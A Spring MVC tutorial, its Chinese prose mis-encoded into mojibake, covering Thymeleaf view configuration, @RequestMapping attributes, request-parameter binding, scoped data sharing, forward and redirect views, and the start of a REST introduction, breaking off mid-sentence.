xsi:schemalocation="<http://www.springframework.org/schema/beans> <http://www.springframework.org/schema/beans/spring-beans.xsd>\n                            <http://www.springframework.org/schema/context> <http://www.springframework.org/schema/context/spring-context.xsd>">\n\n    <context:component-scan base-package="com.pwddd.mvc" />\n    \x3c!-- éç½®thymeleafè§å¾è§£æå¨ --\x3e\n    <bean id="viewresolver" class="org.thymeleaf.spring5.view.thymeleafviewresolver">\n        <property name="order" value="1"/>\n        <property name="characterencoding" value="utf-8"/>\n        <property name="templateengine">\n            <bean class="org.thymeleaf.spring5.springtemplateengine">\n                <property name="templateresolver">\n                    <bean class="org.thymeleaf.spring5.templateresolver.springresourcetemplateresolver">\n\n                        \x3c!-- è§å¾åç¼ --\x3e\n                        <property name="prefix" value="/web-inf/templates/"/>\n\n                        \x3c!-- è§å¾åç¼ --\x3e\n                        <property name="suffix" value=".html"/>\n                        <property name="templatemode" value="html5"/>\n                        <property name="characterencoding" value="utf-8" />\n                    </bean>\n                </property>\n            </bean>\n        </property>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# æµè¯\n\n 1. å®ç°å¯¹é¦é¡µçè®¿é® å¨è¯·æ±æ§å¶å¨ä¸­åå»ºå¤çè¯·æ±çæ¹æ³\n\n// @requestmappingæ³¨è§£ï¼å¤çè¯·æ±åæ§å¶å¨æ¹æ³ä¹é´çæ å°å³ç³»\n// @requestmappingæ³¨è§£çvalueå±æ§å¯ä»¥éè¿è¯·æ±å°åå¹éè¯·æ±ï¼/è¡¨ç¤ºçå½åå·¥ç¨çä¸ä¸æè·¯å¾\n// localhost:8080/springmvc/\n@requestmapping("/")\npublic string index() {\n    //è®¾ç½®è§å¾åç§°\n    return "index";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. éè¿è¶é¾æ¥è·³è½¬å°æå®é¡µé¢ å¨ä¸»é¡µindex.htmlä¸­è®¾ç½®è¶é¾æ¥\n\n<!doctype html>\n<html lang="en" xmlns:th="<http://www.thymeleaf.org>">\n<head>\n    <meta charset="utf-8">\n    <title>é¦é¡µ</title>\n</head>\n<body>\n    <h1>é¦é¡µ</h1>\n    <a th:href="@{/hello}">helloworld</a><br/>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nå¨è¯·æ±æ§å¶å¨ä¸­åå»ºå¤çè¯·æ±çæ¹æ³\n\n@requestmapping("/hello")\npublic string helloworld() {\n    return "target";\n}\n\n\n1\n2\n3\n4\n\n\n\n# æ»ç»\n\næµè§å¨åéè¯·æ±ï¼è¥è¯·æ±å°åç¬¦ååç«¯æ§å¶å¨çurl-patternï¼è¯¥è¯·æ±å°±ä¼è¢«åç«¯æ§å¶å¨dispatcherservletå¤çãåç«¯æ§å¶å¨ä¼è¯»åspringmvcçæ ¸å¿éç½®æä»¶ï¼éè¿æ«æç»ä»¶æ¾å°æ§å¶å¨ï¼å°è¯·æ±å°ååæ§å¶å¨ä¸­@requestmappingæ³¨è§£çvalueå±æ§å¼è¿è¡å¹éï¼è¥å¹éæåï¼è¯¥æ³¨è§£ææ è¯çæ§å¶å¨æ¹æ³å°±æ¯å¤çè¯·æ±çæ¹æ³ãå¤çè¯·æ±çæ¹æ³éè¦è¿åä¸ä¸ªå­ç¬¦ä¸²ç±»åçè§å¾åç§°ï¼è¯¥è§å¾åç§°ä¼è¢«è§å¾è§£æå¨è§£æï¼å ä¸åç¼ååç¼ç»æè§å¾çè·¯å¾ï¼éè¿thymeleafå¯¹è§å¾è¿è¡æ¸²æï¼æç»è½¬åå°è§å¾æå¯¹åºé¡µé¢\n\n\n# requestmappingæ³¨è§£\n\n\n# @requestmappingæ³¨è§£çåè½\n\nä»æ³¨è§£åç§°ä¸æä»¬å¯ä»¥çå°ï¼@requestmappingæ³¨è§£çä½ç¨å°±æ¯å°è¯·æ±åå¤çè¯·æ±çæ§å¶å¨æ¹æ³å³èèµ·æ¥ï¼å»ºç«æ å°å³ç³»ã springmvc æ¥æ¶å°æå®çè¯·æ±ï¼å°±ä¼æ¥æ¾å°å¨æ å°å³ç³»ä¸­å¯¹åºçæ§å¶å¨æ¹æ³æ¥å¤çè¿ä¸ªè¯·æ±ã\n\n\n# @requestmappingæ³¨è§£çä½ç½®\n\n@requestmappingæ è¯ä¸ä¸ªç±»ï¼è®¾ç½®æ å°è¯·æ±çè¯·æ±è·¯å¾çåå§ä¿¡æ¯ @requestmappingæ è¯ä¸ä¸ªæ¹æ³ï¼è®¾ç½®æ å°è¯·æ±è¯·æ±è·¯å¾çå·ä½ä¿¡æ¯\n\n@controller\n@requestmapping("/test")\npublic class requestmappingcontroller {\n\n    //æ­¤æ¶è¯·æ±æ å°ææ å°çè¯·æ±çè¯·æ±è·¯å¾ä¸ºï¼/test/testrequestmapping\n    @requestmapping("/testrequestmapping")\n    public string testrequestmapping(){\n        return "success";\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# @requestmappingæ³¨è§£çvalueå±æ§\n\n@requestmappingæ³¨è§£çvalueå±æ§éè¿è¯·æ±çè¯·æ±å°åå¹éè¯·æ±æ å° @requestmappingæ³¨è§£çvalueå±æ§æ¯ä¸ä¸ªå­ç¬¦ä¸²ç±»åçæ°ç»ï¼è¡¨ç¤ºè¯¥è¯·æ±æ å°è½å¤å¹éå¤ä¸ªè¯·æ±å°åæå¯¹åºçè¯·æ± @requestmappingæ³¨è§£çvalueå±æ§å¿é¡»è®¾ç½®ï¼è³å°éè¿è¯·æ±å°åå¹éè¯·æ±æ å°\n\n<a th:href="@{/test/testrequestmapping/}" >æµè¯testrequestmapping</a><br>  \n<a th:href="@{/test/test/}" >æµè¯testrequestmapping---test</a><br>\n\n\n1\n2\n\n\n@requestmapping(\n        value = {"/testrequestmapping", "/test"}\n)\npublic string testrequestmapping(){\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# @requestmappingæ³¨è§£çmethodå±æ§\n\n@requestmappingæ³¨è§£çmethodå±æ§éè¿è¯·æ±çè¯·æ±æ¹å¼ï¼getæpostï¼å¹éè¯·æ±æ å° @requestmappingæ³¨è§£çmethodå±æ§æ¯ä¸ä¸ªrequestmethodç±»åçæ°ç»ï¼è¡¨ç¤ºè¯¥è¯·æ±æ å°è½å¤å¹éå¤ç§è¯·æ±æ¹å¼çè¯·æ± è¥å½åè¯·æ±çè¯·æ±å°åæ»¡è¶³è¯·æ±æ å°çvalueå±æ§ï¼ä½æ¯è¯·æ±æ¹å¼ä¸æ»¡è¶³methodå±æ§ï¼åæµè§å¨æ¥é405ï¼request method \'post\' not supported\n\n<form th:action="@{/test/testmethod}" method="post" >  \n <input type="submit">  \n</form>\n\n\n1\n2\n3\n\n\n@requestmapping(  \n value = {"/testmethod"},  \n method = requestmethod.post  \n)  \npublic string testmethod(){  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> tipsï¼ 1ãå¯¹äºå¤çæå®è¯·æ±æ¹å¼çæ§å¶å¨æ¹æ³ï¼springmvcä¸­æä¾äº@requestmappingçæ´¾çæ³¨è§£\n> \n> å¤çgetè¯·æ±çæ å°--\x3e@getmapping\n> \n> å¤çpostè¯·æ±çæ å°--\x3e@postmapping\n> \n> å¤çputè¯·æ±çæ å°--\x3e@putmapping\n> \n> å¤çdeleteè¯·æ±çæ å°--\x3e@deletemapping\n> \n> 2ãå¸¸ç¨çè¯·æ±æ¹å¼ægetï¼postï¼putï¼delete\n> \n> ä½æ¯ç®åæµè§å¨åªæ¯ægetåpostï¼è¥å¨formè¡¨åæäº¤æ¶ï¼ä¸ºmethodè®¾ç½®äºå¶ä»è¯·æ±æ¹å¼çå­ç¬¦ä¸²ï¼putædeleteï¼ï¼åæç§é»è®¤çè¯·æ±æ¹å¼getå¤ç\n> \n> è¥è¦åéputådeleteè¯·æ±ï¼åéè¦éè¿springæä¾çè¿æ»¤å¨hiddenhttpmethodfilterï¼å¨restfulé¨åä¼è®²å°ã\n\n\n# @requestmappingæ³¨è§£çparamså±æ§\n\n@requestmappingæ³¨è§£çparamså±æ§éè¿è¯·æ±çè¯·æ±åæ°å¹éè¯·æ±æ å° @requestmappingæ³¨è§£çparamså±æ§æ¯ä¸ä¸ªå­ç¬¦ä¸²ç±»åçæ°ç»ï¼å¯ä»¥éè¿åç§è¡¨è¾¾å¼è®¾ç½®è¯·æ±åæ°åè¯·æ±æ å°çå¹éå³ç³» "param"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»æºå¸¦paramè¯·æ±åæ° "!param"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»ä¸è½æºå¸¦paramè¯·æ±åæ° "param=value"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»æºå¸¦paramè¯·æ±åæ°ä¸param=value "param!=value"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»æºå¸¦paramè¯·æ±åæ°ä½æ¯param!=value\n\n<a th:href="@{/test/testparam(username=\'zhangsan\',password=123456)}" >æµè¯param</a>\n\n\n1\n\n\n@requestmapping(value = "testparam",method = requestmethod.get,params = {"!haha","username=zhangsan"})  \npublic string testparam(){  \n return "success";  \n}\n\n\n1\n2\n3\n4\n\n\n\n\n> æ³¨ï¼ è¥å½åè¯·æ±æ»¡è¶³@requestmappingæ³¨è§£çvalueåmethodå±æ§ï¼ä½æ¯ä¸æ»¡è¶³paramså±æ§ï¼æ­¤æ¶é¡µé¢åæ¥é400ï¼parameter conditions "username, password!=123456" not met for actual request parameters: username={admin}, password={123456}\n\n\n# @requestmappingæ³¨è§£çheaderså±æ§\n\n@requestmappingæ³¨è§£çheaderså±æ§éè¿è¯·æ±çè¯·æ±å¤´ä¿¡æ¯å¹éè¯·æ±æ å°\n\n@requestmappingæ³¨è§£çheaderså±æ§æ¯ä¸ä¸ªå­ç¬¦ä¸²ç±»åçæ°ç»ï¼å¯ä»¥éè¿åç§è¡¨è¾¾å¼è®¾ç½®è¯·æ±å¤´ä¿¡æ¯åè¯·æ±æ å°çå¹éå³ç³»\n\n"header"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»æºå¸¦headerè¯·æ±å¤´ä¿¡æ¯\n\n"!header"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»ä¸è½æºå¸¦headerè¯·æ±å¤´ä¿¡æ¯\n\n"header=value"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»æºå¸¦headerè¯·æ±å¤´ä¿¡æ¯ä¸header=value\n\n"header!=value"ï¼è¦æ±è¯·æ±æ å°æå¹éçè¯·æ±å¿é¡»æºå¸¦headerè¯·æ±å¤´ä¿¡æ¯ä¸header!=value\n\nè¥å½åè¯·æ±æ»¡è¶³@requestmappingæ³¨è§£çvalueåmethodå±æ§ï¼ä½æ¯ä¸æ»¡è¶³headerså±æ§ï¼æ­¤æ¶é¡µé¢æ¾ç¤º404éè¯¯ï¼å³èµæºæªæ¾å°\n\n\n# springmvcæ¯æanté£æ ¼çè·¯å¾\n\nï¼ï¼è¡¨ç¤ºä»»æçåä¸ªå­ç¬¦\n\n*ï¼è¡¨ç¤ºä»»æç0ä¸ªæå¤ä¸ªå­ç¬¦\n\n**ï¼è¡¨ç¤ºä»»æçä¸å±æå¤å±ç®å½\n\næ³¨æï¼å¨ä½¿ç¨**æ¶ï¼åªè½ä½¿ç¨/**/xxxçæ¹å¼\n\n\n# springmvcæ¯æè·¯å¾ä¸­çå ä½ç¬¦\n\nåå§æ¹å¼ï¼/deleteuser?id=1\n\nrestæ¹å¼ï¼/user/1 è¯·æ±æ¹å¼ä¸ºï¼delete\n\nspringmvcè·¯å¾ä¸­çå ä½ç¬¦å¸¸ç¨äºrestfulé£æ ¼ä¸­ï¼å½è¯·æ±è·¯å¾ä¸­å°æäºæ°æ®éè¿è·¯å¾çæ¹å¼ä¼ è¾å°æå¡å¨ä¸­ï¼å°±å¯ä»¥å¨ç¸åºç@requestmappingæ³¨è§£çvalueå±æ§ä¸­éè¿å ä½ç¬¦{xxx}è¡¨ç¤ºä¼ è¾çæ°æ®ï¼å¨éè¿@pathvariableæ³¨è§£ï¼å°å ä½ç¬¦æè¡¨ç¤ºçæ°æ®èµå¼ç»æ§å¶å¨æ¹æ³çå½¢å\n\n<a th:href="@{/test/testparam2/1/2/3/4/}" >æµè¯ /1/2/3/4/</a>\n\n\n1\n\n\n@requestmapping(value = "/testparam2/{p1}/{p2}/{p3}/{p4}")  \npublic string testparam2(@pathvariable("p1") string p1,@pathvariable("p2") string p2,@pathvariable("p3") string p3,@pathvariable("p4") string p4){  \n system.out.println(p1+p2+p3+p4);  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# springmvcè·åè¯·æ±åæ°\n\n\n# éè¿servletapiè·å\n\nå°httpservletrequestä½ä¸ºæ§å¶å¨æ¹æ³çå½¢åï¼æ­¤æ¶httpservletrequestç±»åçåæ°è¡¨ç¤ºå°è£äºå½åè¯·æ±çè¯·æ±æ¥æçå¯¹è±¡\n\n<a th:href="@{/test/testservletreq(username=\'zhangsan\',password=1234)}">æµè¯ä»servletapiè·ååæ°</a>\n\n\n1\n\n\n@requestmapping("/testservletreq")  \npublic string testservletreq(httpservletrequest request){  \n string username = request.getparameter("username");  \n string password = request.getparameter("password");  \n system.out.println("username:"+username+": password:"+password);  \n return "success";  \n}\n\n// æ§å¶å°è¾åºï¼username:zhangsan: password:1234\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# éè¿æ§å¶å¨æ¹æ³çå½¢åè·åè¯·æ±åæ°\n\nå¨æ§å¶å¨æ¹æ³çå½¢åä½ç½®ï¼è®¾ç½®åè¯·æ±åæ°ååçå½¢åï¼å½æµè§å¨åéè¯·æ±ï¼å¹éå°è¯·æ±æ å°æ¶ï¼å¨dispatcherservletä¸­å°±ä¼å°è¯·æ±åæ°èµå¼ç»ç¸åºçå½¢åã\n\n<a th:href="@{/test/testcontroller(username=\'zhangsan\',password=1234)}">æµè¯ä»æ§å¶å¨è·ååæ°</a>\n\n\n1\n\n\n@requestmapping("/testcontroller")  \npublic string testservletreq(string username,string password){  \n system.out.println("username:"+username+": password:"+password);  \n return "success";  \n}\n\n//æ§å¶å°è¾åºï¼username:zhangsan: password:1234\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> æ³¨ï¼ è¥è¯·æ±æä¼ è¾çè¯·æ±åæ°ä¸­æå¤ä¸ªååçè¯·æ±åæ°ï¼æ­¤æ¶å¯ä»¥å¨æ§å¶å¨æ¹æ³çå½¢åä¸­è®¾ç½®å­ç¬¦ä¸²æ°ç»æèå­ç¬¦ä¸²ç±»åçå½¢åæ¥æ¶æ­¤è¯·æ±åæ° è¥ä½¿ç¨å­ç¬¦ä¸²æ°ç»ç±»åçå½¢åï¼æ­¤åæ°çæ°ç»ä¸­åå«äºæ¯ä¸ä¸ªæ°æ® è¥ä½¿ç¨å­ç¬¦ä¸²ç±»åçå½¢åï¼æ­¤åæ°çå¼ä¸ºæ¯ä¸ªæ°æ®ä¸­é´ä½¿ç¨éå·æ¼æ¥çç»æ\n\n\n# @requestparam\n\n@requestparamæ¯å°è¯·æ±åæ°åæ§å¶å¨æ¹æ³çå½¢ååå»ºæ å°å³ç³» @requestparamæ³¨è§£ä¸å±æä¸ä¸ªå±æ§ï¼\n\n * valueï¼æå®ä¸ºå½¢åèµå¼çè¯·æ±åæ°çåæ°å\n\n * requiredï¼è®¾ç½®æ¯å¦å¿é¡»ä¼ è¾æ­¤è¯·æ±åæ°ï¼é»è®¤å¼ä¸ºtrue\n   \n   è¥è®¾ç½®ä¸ºtrueæ¶ï¼åå½åè¯·æ±å¿é¡»ä¼ è¾valueææå®çè¯·æ±åæ°ï¼è¥æ²¡æä¼ è¾è¯¥è¯·æ±åæ°ï¼ä¸æ²¡æè®¾ç½®defaultvalueå±æ§ï¼åé¡µé¢æ¥é400ï¼required string parameter \'xxx\' is not presentï¼è¥è®¾ç½®ä¸ºfalseï¼åå½åè¯·æ±ä¸æ¯å¿é¡»ä¼ è¾valueææå®çè¯·æ±åæ°ï¼è¥æ²¡æä¼ è¾ï¼åæ³¨è§£ææ è¯çå½¢åçå¼ä¸ºnull\n\n * defaultvalueï¼ä¸ç®¡requiredå±æ§å¼ä¸ºtrueæfalseï¼å½valueææå®çè¯·æ±åæ°æ²¡æä¼ è¾æä¼ è¾çå¼ä¸º""æ¶ï¼åä½¿ç¨é»è®¤å¼ä¸ºå½¢åèµå¼\n\n\n# @requestheader\n\n@requestheaderæ¯å°è¯·æ±å¤´ä¿¡æ¯åæ§å¶å¨æ¹æ³çå½¢ååå»ºæ å°å³ç³» @requestheaderæ³¨è§£ä¸å±æä¸ä¸ªå±æ§ï¼valueãrequiredãdefaultvalueï¼ç¨æ³å@requestparam\n\n\n# @cookievalue\n\n@cookievalueæ¯å°cookieæ°æ®åæ§å¶å¨æ¹æ³çå½¢ååå»ºæ å°å³ç³» @cookievalueæ³¨è§£ä¸å±æä¸ä¸ªå±æ§ï¼valueãrequiredãdefaultvalueï¼ç¨æ³å@requestparam\n\n\n# éè¿pojoè·åè¯·æ±åæ°\n\nå¯ä»¥å¨æ§å¶å¨æ¹æ³çå½¢åä½ç½®è®¾ç½®ä¸ä¸ªå®ä½ç±»ç±»åçå½¢åï¼æ­¤æ¶è¥æµè§å¨ä¼ è¾çè¯·æ±åæ°çåæ°ååå®ä½ç±»ä¸­çå±æ§åä¸è´ï¼é£ä¹è¯·æ±åæ°å°±ä¼ä¸ºæ­¤å±æ§èµå¼ã\n\n<form th:action="@{/test/testentity}" method="post">  \n <input type="text" value="zhangsan" name="username"> <br>  \n <input type="text" value="123456" name="password"> <br>  \n <input type="text" value="email" name="email"> <br>  \n <input type="submit" value="æµè¯å®ä½æ³¨å¥å±æ§">  \n</form>\n\n\n1\n2\n3\n4\n5\n6\n\n\n@requestmapping(value = "/testentity",method = requestmethod.post)  \npublic string testentity(user user){  \n system.out.println(user);  \n return "success";  \n}\n\n// user{id=\'null\', username=\'zhangsan\', password=\'123456\', email=\'email\'}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# è§£å³è·åè¯·æ±åæ°çä¹±ç é®é¢\n\nä¹±ç é®é¢åä¸ºä¸¤ç§ï¼ç¬¬ä¸ç§ä¸ºgetè¯·æ±åæ°ä¹±ç é®é¢ï¼è§£å³åæ³å¨ javawebä¸­æå°ï¼å¯ä»¥å¨tomcatéç½®æä»¶ä¸­éç½®ãç¬¬äºç§ä¸ºpostè¯·æ±åæ°ä¹±ç ï¼å¯ä»¥éç½®è¿æ»¤å¨è¿è¡è®¾ç½®ç¼ç æ ¼å¼ã è§£å³è·åè¯·æ±åæ°çä¹±ç é®é¢ï¼å¯ä»¥ä½¿ç¨springmvcæä¾çç¼ç è¿æ»¤å¨characterencodingfilterï¼ä½æ¯å¿é¡»å¨web.xmlä¸­è¿è¡æ³¨åã\n\n<filter>  \n <filter-name>characterencodingfilter</filter-name>  \n <filter-class>org.springframework.web.filter.characterencodingfilter</filter-class>  \n <init-param>  \n <param-name>encoding</param-name>  \n <param-value>utf-8</param-value>  \n </init-param>  \n <init-param>  \n <param-name>forceresponseencoding</param-name>  \n <param-value>true</param-value>  \n </init-param>  \n</filter>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n> æ³¨ï¼ springmvcä¸­å¤çç¼ç çè¿æ»¤å¨ä¸å®è¦éç½®å°å¶ä»è¿æ»¤å¨ä¹åï¼å¦åæ æ\n\n\n# åå¯¹è±¡å±äº«æ°æ®\n\n\n# ä½¿ç¨servletapiårequeståå¯¹è±¡å±äº«æ°æ®\n\n@requestmapping("/testservletapi")  \npublic string testservletapi(httpservletrequest request){  \n request.setattribute("testscope","hello,servletapi");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# ä½¿ç¨modelandviewårequeståå¯¹è±¡å±äº«æ°æ®\n\n@requestmapping("/testmodelandview")  \npublic modelandview testmodelandview(){  \n modelandview modelandview = new modelandview();  \n modelandview.setviewname("success");  \n modelandview.addobject("testscope","hello,modelandview");  \n return modelandview;  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# ä½¿ç¨modelårequeståå¯¹è±¡å±äº«æ°æ®\n\n@requestmapping("/testmodel")  \npublic string testmodelandview(model model){  \n model.addattribute("testscope","hello,model");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# ä½¿ç¨mapårequeståå¯¹è±¡å±äº«æ°æ®\n\n@requestmapping("/testmap")  \npublic string testmap(map<string,object> map){  \n map.put("testscope","hello,model");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# ä½¿ç¨modelmapårequeståå¯¹è±¡å±äº«æ°æ®\n\n@requestmapping("/testmodelmap")  \npublic string testmodelmap(modelmap modelmap){  \n modelmap.put("testscope","hello,modelmap");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# modelãmodelmapãmapçå³ç³»\n\nmodelãmodelmapãmapç±»åçåæ°å¶å®æ¬è´¨ä¸é½æ¯ bindingawaremodelmap ç±»åç\n\npublic interface model{}\npublic class modelmap extends linkedhashmap<string, object> {}\npublic class extendedmodelmap extends modelmap implements model {}\npublic class bindingawaremodelmap extends extendedmodelmap {}\n\n\n1\n2\n3\n4\n\n\n\n# sessionåå±äº«æ°æ®\n\n<p th:text="${session.testscope}" ></p>\n\n\n1\n\n\n@requestmapping("/testsession")  \npublic string testsession(httpsession session){  \n session.setattribute("testscope","hello,session");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# applicationåå±äº«æ°æ®\n\n<p th:text="${application.testscope}" ></p>\n\n\n1\n\n\n@requestmapping("/testapplication")  \npublic string testapplication(httpsession session){  \n servletcontext servletcontext = session.getservletcontext();  \n servletcontext.setattribute("testscope","hello,application");  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# springmvcçè§å¾\n\nspringmvcä¸­çè§å¾æ¯viewæ¥å£ï¼è§å¾çä½ç¨æ¸²ææ°æ®ï¼å°æ¨¡åmodelä¸­çæ°æ®å±ç¤ºç»ç¨æ· springmvcè§å¾çç§ç±»å¾å¤ï¼é»è®¤æè½¬åè§å¾åéå®åè§å¾ å½å·¥ç¨å¼å¥jstlçä¾èµï¼è½¬åè§å¾ä¼èªå¨è½¬æ¢ä¸ºjstlview è¥ä½¿ç¨çè§å¾ææ¯ä¸ºthymeleafï¼å¨springmvcçéç½®æä»¶ä¸­éç½®äºthymeleafçè§å¾è§£æå¨ï¼ç±æ­¤è§å¾è§£æå¨è§£æä¹åæå¾å°çæ¯thymeleafviewã\n\n\n# thymeleafview\n\nå½æ§å¶å¨æ¹æ³ä¸­æè®¾ç½®çè§å¾åç§°æ²¡æä»»ä½åç¼æ¶ï¼æ­¤æ¶çè§å¾åç§°ä¼è¢«springmvcéç½®æä»¶ä¸­æéç½®çè§å¾è§£æå¨è§£æï¼è§å¾åç§°æ¼æ¥è§å¾åç¼åè§å¾åç¼æå¾å°çæç»è·¯å¾ï¼ä¼éè¿è½¬åçæ¹å¼å®ç°è·³è½¬ã\n\n@requestmapping("/test")  \npublic string test(){  \n return "success";  \n}\n\n\n1\n2\n3\n4\n\n\n\n\n\n# è½¬åè§å¾\n\nspringmvcä¸­é»è®¤çè½¬åè§å¾æ¯internalresourceview springmvcä¸­åå»ºè½¬åè§å¾çæåµï¼ å½æ§å¶å¨æ¹æ³ä¸­æè®¾ç½®çè§å¾åç§°ä»¥"forward:"ä¸ºåç¼æ¶ï¼åå»ºinternalresourceviewè§å¾ï¼æ­¤æ¶çè§å¾åç§°ä¸ä¼è¢«springmvcéç½®æä»¶ä¸­æéç½®çè§å¾è§£æå¨è§£æï¼èæ¯ä¼å°åç¼"forward:"å»æï¼å©ä½é¨åä½ä¸ºæç»è·¯å¾éè¿è½¬åçæ¹å¼å®ç°è·³è½¬\n\nä¾å¦"forward:/"ï¼"forward:/employee"\n\n@requestmapping("/testforward")\npublic string testforward(){\n    return "forward:/testhello";\n}\n\n\n1\n2\n3\n4\n\n\n\n\n\n# éå®åè§å¾\n\nspringmvcä¸­é»è®¤çéå®åè§å¾æ¯redirectview å½æ§å¶å¨æ¹æ³ä¸­æè®¾ç½®çè§å¾åç§°ä»¥"redirect:"ä¸ºåç¼æ¶ï¼åå»ºredirectviewè§å¾ï¼æ­¤æ¶çè§å¾åç§°ä¸ä¼è¢«springmvcéç½®æä»¶ä¸­æéç½®çè§å¾è§£æå¨è§£æï¼èæ¯ä¼å°åç¼"redirect:"å»æï¼å©ä½é¨åä½ä¸ºæç»è·¯å¾éè¿éå®åçæ¹å¼å®ç°è·³è½¬\n\nä¾å¦"redirect:/"ï¼"redirect:/employee"\n\n@requestmapping("/testredirect")\npublic string testredirect(){\n    return "redirect:/testhello";\n}\n\n\n1\n2\n3\n4\n\n\n\n\n> æ³¨ï¼ éå®åè§å¾å¨è§£ææ¶ï¼ä¼åå°redirect:åç¼å»æï¼ç¶åä¼å¤æ­å©ä½é¨åæ¯å¦ä»¥/å¼å¤´ï¼è¥æ¯åä¼èªå¨æ¼æ¥ä¸ä¸æè·¯å¾ã\n\n\n# è§å¾æ§å¶å¨view-controller\n\nå½æ§å¶å¨æ¹æ³ä¸­ï¼ä»ä»ç¨æ¥å®ç°é¡µé¢è·³è½¬ï¼å³åªéè¦è®¾ç½®è§å¾åç§°æ¶ï¼å¯ä»¥å°å¤çå¨æ¹æ³ä½¿ç¨view-controlleræ ç­¾è¿è¡è¡¨ç¤ºã\n\n\x3c!--\n    pathï¼è®¾ç½®å¤ççè¯·æ±å°å\n    view-nameï¼è®¾ç½®è¯·æ±å°åæå¯¹åºçè§å¾åç§°\n--\x3e\n<mvc:view-controller path="/testview" view-name="success"></mvc:view-controller>\n\n\n1\n2\n3\n4\n5\n\n\n> æ³¨ï¼ å½springmvcä¸­è®¾ç½®ä»»ä½ä¸ä¸ªview-controlleræ¶ï¼å¶ä»æ§å¶å¨ä¸­çè¯·æ±æ å°å°å¨é¨å¤±æï¼æ­¤æ¶éè¦å¨springmvcçæ ¸å¿éç½®æä»¶ä¸­è®¾ç½®å¼å¯mvcæ³¨è§£é©±å¨çæ ç­¾ï¼ <mvc:annotation-driven />\n\n\n# restful\n\n\n# restfulç®ä»\n\nrestï¼representational state transferï¼è¡¨ç°å±èµæºç¶æè½¬ç§»ã\n\n# èµæº\n\nèµæºæ¯ä¸ç§çå¾æå¡å¨çæ¹å¼ï¼å³ï¼å°æå¡å¨çä½æ¯ç±å¾å¤ç¦»æ£çèµæºç»æãæ¯ä¸ªèµæºæ¯æå¡å¨ä¸ä¸ä¸ªå¯å½åçæ½è±¡æ¦å¿µãå ä¸ºèµæºæ¯ä¸ä¸ªæ½è±¡çæ¦å¿µï¼æä»¥å®ä¸ä»ä»è½ä»£è¡¨æå¡å¨æä»¶ç³»ç»ä¸­çä¸ä¸ªæä»¶ãæ°æ®åºä¸­çä¸å¼ è¡¨ç­ç­å·ä½çä¸è¥¿ï¼å¯ä»¥å°èµæºè®¾è®¡çè¦å¤æ½è±¡æå¤æ½è±¡ï¼åªè¦æ³è±¡ååè®¸èä¸å®¢æ·ç«¯åºç¨å¼åèè½å¤çè§£ãä¸é¢åå¯¹è±¡è®¾è®¡ç±»ä¼¼ï¼èµæºæ¯ä»¥åè¯ä¸ºæ ¸å¿æ¥ç»ç»çï¼é¦åå³æ³¨çæ¯åè¯ãä¸ä¸ªèµæºå¯ä»¥ç±ä¸ä¸ªæå¤ä¸ªuriæ¥æ è¯ãuriæ¢æ¯èµæºçåç§°ï¼ä¹æ¯èµæºå¨webä¸çå°åãå¯¹æä¸ªèµæºæå´è¶£çå®¢æ·ç«¯åºç¨ï¼å¯ä»¥éè¿èµæºçuriä¸å¶è¿è¡äº¤äºã\n\n# èµæºçè¡¨è¿°\n\nèµæºçè¡¨è¿°æ¯ä¸æ®µå¯¹äºèµæºå¨æä¸ªç¹å®æ¶å»çç¶æçæè¿°ãå¯ä»¥å¨å®¢æ·ç«¯-æå¡å¨ç«¯ä¹é´è½¬ç§»ï¼äº¤æ¢ï¼ãèµæºçè¡¨è¿°å¯ä»¥æå¤ç§æ ¼å¼ï¼ä¾å¦html/xml/json/çº¯ææ¬/å¾ç/è§é¢/é³é¢ç­ç­ãèµæºçè¡¨è¿°æ ¼å¼å¯ä»¥éè¿ååæºå¶æ¥ç¡®å®ãè¯·æ±-ååºæ¹åçè¡¨è¿°éå¸¸ä½¿ç¨ä¸åçæ ¼å¼ã\n\n# ç¶æè½¬ç§»\n\nç¶æè½¬ç§»è¯´çæ¯ï¼å¨å®¢æ·ç«¯åæå¡å¨ç«¯ä¹é´è½¬ç§»ï¼transferï¼ä»£è¡¨èµæºç¶æçè¡¨è¿°ãéè¿è½¬ç§»åæä½èµæºçè¡¨è¿°ï¼æ¥é´æ¥å®ç°æä½èµæºçç®çã\n\n\n# restfulçå®ç°\n\nå·ä½è¯´ï¼å°±æ¯ http åè®®éé¢ï¼åä¸ªè¡¨ç¤ºæä½æ¹å¼çå¨è¯ï¼getãpostãputãdeleteã å®ä»¬åå«å¯¹åºåç§åºæ¬æä½ï¼get ç¨æ¥è·åèµæºï¼post ç¨æ¥æ°å»ºèµæºï¼put ç¨æ¥æ´æ°èµæºï¼delete ç¨æ¥å 